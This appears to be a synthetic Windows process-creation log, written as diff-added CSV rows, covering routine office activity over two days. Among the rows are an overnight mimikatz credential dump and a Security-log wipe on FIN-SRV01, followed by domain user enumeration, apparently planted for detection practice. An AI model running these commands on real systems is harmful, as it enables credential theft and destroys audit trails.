+2026-11-11 09:49:21,4688,100568,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 10:09:10,4688,100573,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:10:53,4688,100574,WS-ENG-08,vikram.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 10:18:05,4688,100575,WS-ENG-03,rohan.iyer,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 10:22:26,4688,100576,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:29:07,4688,100579,WS-HR-02,harish.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:29:59,4688,100580,WS-HR-07,nisha.gupta,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 10:30:51,4688,100582,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 10:32:03,4688,100584,WS-SALES-04,pooja.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 10:32:26,4688,100585,WS-SALES-04,naveen.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:35:16,4688,100587,LT-NEW-03,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 10:35:36,4688,100588,SQL01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-11 10:36:26,4688,100589,WS-ENG-08,vikram.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 10:38:30,4688,100590,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:38:35,4688,100591,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 10:45:12,4688,100592,WS-HR-02,harish.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 10:47:55,4688,100593,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 10:47:56,4688,100594,WS-FIN-01,priya.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 10:57:00,4688,100597,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 11:29:03,4688,100602,WS-SALES-04,pooja.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 11:29:28,4688,100603,FS01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object Status -eq Stopped"""
+2026-11-11 11:30:52,4688,100604,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 11:32:11,4688,100605,WS-FIN-06,shalini.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 11:38:46,4688,100608,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 11:42:17,4688,100609,SQL01,admin02,C:\Windows\System32\mmc.exe,C:\Windows\System32\explorer.exe,mmc.exe C:\Windows\system32\dsa.msc
+2026-11-11 11:48:27,4688,100610,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 11:55:55,4688,100611,WS-FIN-01,priya.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 12:00:04,4688,100612,WS-FIN-06,manoj.iyer,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 12:07:09,4688,100616,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 12:07:57,4688,100617,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 12:09:27,4688,100618,WS-ENG-08,vikram.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 12:09:30,4688,100619,WS-SALES-04,pooja.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 12:10:08,4688,100620,WS-SALES-04,naveen.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 12:10:39,4688,100621,WS-HR-07,manoj.verma,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 12:10:49,4688,100623,WS-HR-02,sanjay.pillai,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 12:12:59,4688,100624,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 12:16:31,4688,100627,LT-NEW-01,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 12:19:24,4688,100629,WS-ENG-03,rohan.iyer,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 12:25:27,4688,100630,WS-HR-02,harish.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 12:30:58,4688,100631,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 12:33:19,4688,100632,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 12:34:01,4688,100633,WS-HR-02,sanjay.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 12:37:59,4688,100634,WS-IT-02,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 12:38:55,4688,100635,WS-IT-02,admin02,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 12:39:01,4688,100636,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 12:40:09,4688,100638,WS-SALES-04,naveen.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 12:52:50,4688,100639,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 12:54:53,4688,100640,WS-ENG-08,vikram.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 12:55:16,4688,100641,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 12:56:40,4688,100642,WS-HR-02,harish.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 12:59:12,4688,100643,WS-FIN-01,priya.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 13:01:09,4688,100645,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 13:06:49,4688,100646,WS-ENG-03,rohan.iyer,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 13:07:21,4688,100647,WS-FIN-01,priya.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 13:08:06,4688,100648,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 13:12:54,4688,100650,WS-ENG-03,rohan.iyer,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 13:17:28,4688,100652,WS-FIN-06,shalini.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 13:25:56,4688,100653,WS-FIN-06,manoj.iyer,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 13:28:03,4688,100654,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 13:33:14,4688,100655,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 13:35:11,4688,100656,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 13:35:17,4688,100657,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 13:37:41,4688,100658,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 13:40:33,4688,100659,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 13:51:56,4688,100660,WS-SALES-04,pooja.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 13:55:47,4688,100661,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 13:56:57,4688,100662,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 14:00:53,4688,100663,WS-OPS-05,naveen.das,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 14:02:24,4688,100664,WS-SALES-04,pooja.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 14:03:22,4688,100665,WS-ENG-03,rohan.iyer,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 14:07:31,4688,100666,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 14:14:42,4688,100668,WS-SALES-04,pooja.gupta,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 14:21:31,4688,100669,WS-FIN-06,shalini.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 14:23:02,4688,100670,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 14:31:14,4688,100672,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 14:39:44,4688,100673,WS-HR-07,nisha.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 14:39:46,4688,100674,WS-FIN-01,priya.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 14:40:17,4688,100675,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 14:40:36,4688,100676,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 15:01:32,4688,100679,WS-ENG-08,vikram.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 15:01:55,4688,100680,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 15:07:05,4688,100681,WS-IT-01,admin01,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 15:07:43,4688,100682,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 15:10:57,4688,100683,WS-SALES-04,naveen.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 15:14:13,4688,100684,WS-SALES-04,naveen.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 15:14:45,4688,100685,WS-FIN-06,shalini.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 15:23:15,4688,100686,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 15:32:09,4688,100687,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 15:41:55,4688,100688,WS-HR-02,sanjay.pillai,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 15:46:37,4688,100690,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 15:50:52,4688,100691,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 16:02:37,4688,100693,WS-HR-07,manoj.verma,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 16:13:54,4688,100694,WS-HR-07,nisha.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 16:14:37,4688,100695,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 16:21:41,4688,100696,WS-SALES-04,naveen.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 16:25:15,4688,100697,WS-ENG-03,rohan.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 16:29:04,4688,100698,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 16:29:29,4688,100699,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 16:31:07,4688,100700,WS-HR-07,manoj.verma,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 16:42:15,4688,100704,WS-HR-02,harish.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 16:50:17,4688,100708,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 16:55:08,4688,100709,WS-IT-02,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 16:59:37,4688,100710,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 17:08:06,4688,100712,WS-HR-07,manoj.verma,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 17:25:03,4688,100717,FS01,admin02,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-11 17:39:01,4688,100721,WS-IT-01,admin01,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 17:39:20,4688,100722,WS-IT-01,admin01,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-11 17:47:51,4688,100728,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 17:48:08,4688,100729,WS-HR-07,manoj.verma,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 17:51:41,4688,100730,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 18:04:43,4688,100736,WS-FIN-06,manoj.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 18:17:14,4688,100738,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-11 19:30:12,4688,100742,WS-OPS-10,priya.kumar,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 20:48:59,4688,100745,WS-OPS-05,karthik.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 20:51:44,4688,100746,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 21:11:28,4688,100748,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 23:26:08,4688,100749,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 23:32:53,4688,100750,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 00:15:02,4688,100753,WS-OPS-10,priya.kumar,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 01:14:56,4688,100757,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-12 01:27:53,4688,100758,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 01:34:33,4688,100761,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-12 01:55:53,4688,100763,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 02:21:52,4688,100765,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 02:58:04,4688,100768,WS-OPS-10,priya.kumar,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 02:58:27,4688,100769,FIN-SRV01,admin02,C:\Windows\System32\mimikatz.exe,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit"
+2026-11-12 03:15:32,4688,100770,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 03:21:59,4688,100772,FIN-SRV01,admin02,C:\Windows\System32\wevtutil.exe,C:\Windows\System32\cmd.exe,wevtutil.exe cl Security
+2026-11-12 03:22:00,1102,100773,FIN-SRV01,admin02,,,
+2026-11-12 07:36:13,4688,100779,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:12:19,4688,100781,WS-HR-07,nisha.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:25:15,4688,100783,WS-IT-01,admin01,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:26:26,4688,100785,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:32:59,4688,100787,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:41:37,4688,100789,WS-IT-02,admin02,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:42:23,4688,100791,WS-HR-02,harish.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:43:11,4688,100794,WS-FIN-01,karthik.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:55:10,4688,100796,WS-IT-02,admin02,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 08:59:00,4688,100800,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:59:47,4688,100802,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 08:59:48,4688,100803,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 09:04:17,4688,100805,WS-ENG-03,rohan.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 09:04:38,4688,100807,WS-FIN-06,manoj.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 09:06:57,4688,100808,DC01,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c net user /domain
+2026-11-12 09:15:35,4688,100809,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 09:17:23,4688,100812,DC01,admin02,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-12 09:31:00,4688,100813,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 09:34:56,4688,100815,WS-SALES-04,naveen.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 09:36:11,4688,100817,WS-OPS-05,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 09:39:51,4688,100818,WS-ENG-08,vikram.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 09:45:10,4688,100820,WS-FIN-06,manoj.iyer,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 09:49:07,4688,100821,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 09:53:23,4688,100822,WS-FIN-06,manoj.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 09:57:18,4688,100823,WS-HR-02,sanjay.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 09:59:18,4688,100826,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 10:06:04,4688,100830,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 10:06:50,4688,100831,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
